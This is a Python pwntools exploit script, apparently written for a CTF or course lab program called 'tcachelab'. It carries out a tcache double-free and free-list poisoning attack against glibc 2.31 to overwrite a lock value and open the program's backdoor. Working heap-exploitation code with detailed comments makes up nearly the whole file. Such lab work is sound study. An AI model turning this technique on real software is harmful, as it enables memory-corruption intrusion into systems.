#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
    notes.create(16, b'AAAA', 0, b'AAAA')
    notes.delete(0)

    notes.edit(0, 0, b'AAAA')
    notes.delete(0)

    notes.edit(0, 0, b'AAAA')
    notes.delete(0)

    notes.create(16, p64(notes.mmap_addr), 0, b'AAAA')
    notes.create(16, b'AAAA', 0, b'AAAA')
    notes.create(16, b'AAAA', 0, p64(0xcafedeadbeefcafe))

    notes.backdoor()
'''

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('/home/tcachelab/tcachelab')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

# Byte sequence alias
A4 = 4 * b'A'

class Notebook:
    def __init__(self, proc):
        self.proc = proc
        self.proc.recvuntil('Lock address : ')
        self.mmap_addr = int(self.proc.recvline().strip(), 16) - 0x18
        log.info('mmap_addr: {}'.format(hex(self.mmap_addr)))

    def create(self, size: int, fd: bytes, key: int, content: bytes):
        self.proc.recvuntil('Choice >')
        self.proc.send(b'1')
        self.proc.recvuntil('Note size : ')
        self.proc.send(str(size).encode('utf-8'))
        self.proc.recvuntil('Owner : ')
        self.proc.send(fd)
        self.proc.recvuntil('UUID : ')
        self.proc.send(str(key).encode('utf-8'))
        self.proc.recvuntil('Content : ')
        self.proc.send(content)

    def edit(self, index: int, key: int, content: bytes):
        self.proc.recvuntil('Choice >')
        self.proc.send(b'2')
        self.proc.recvuntil('Note index : ')
        self.proc.send(str(index).encode('utf-8'))
        self.proc.recvuntil('UUID : ')
        self.proc.send(str(key).encode('utf-8'))
        self.proc.recvuntil('Content : ')
        self.proc.send(content)

    def delete(self, index: int):
        self.proc.recvuntil('Choice >')
        self.proc.send(b'3')
        self.proc.recvuntil('Note index : ')
        self.proc.send(str(index).encode('utf-8'))

    def backdoor(self):
        self.proc.recvuntil('Choice >')
        self.proc.send(b'4')


def main():
    #proc = remote('140.112.31.97', 30106)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    notes = Notebook(proc)
    target = notes.mmap_addr
    passwd = 0xcafedeadbeefcafe

    # a chunk...
    # the first  8 bytes = fd ptr
    # the second 8 bytes = key
    notes.create(32, b'AAAA', 0, b'AAAA')         # chunk1
    notes.delete(0)                               # free(chunk1)
    # tcache list: [ chunk1 ]

    notes.edit(0, 0, b'AAAA')                     # modify chunk1's key
    notes.delete(0)                               # double free(chunk1) to dup
    # tcache list: [ chunk1 -> chunk1 ]

    notes.edit(0, 0, b'AAAA')                     # modify chunk1's key again
    notes.delete(0)                               # triple free(chunk1) to dup
    # tcache list: [ chunk1 -> chunk1 -> chunk1 ]

    notes.create(32, p64(target), 0, b'AAAA')     # get chunk1
    # tcache list: [ chunk1 -> target ]
    # chunk1 = { fd: target, key: 0, content: b'AAAA' }

    notes.create(32, b'AAAA', 0, b'AAAA')         # get chunk1 again
    # tcache list: [ target ]
    # chunk1 = { fd: 0, key: 0, content: b'AAAA' }

    notes.create(32, p64(0), 0, p64(passwd))     # get target and write passwd
    # tcache list: []
    # chunk1 = { fd: target, key: 0, content: passwd }

    input('Press ENTER to open the backdoor')
    notes.backdoor()

    proc.interactive()


if __name__ == '__main__':
    main()
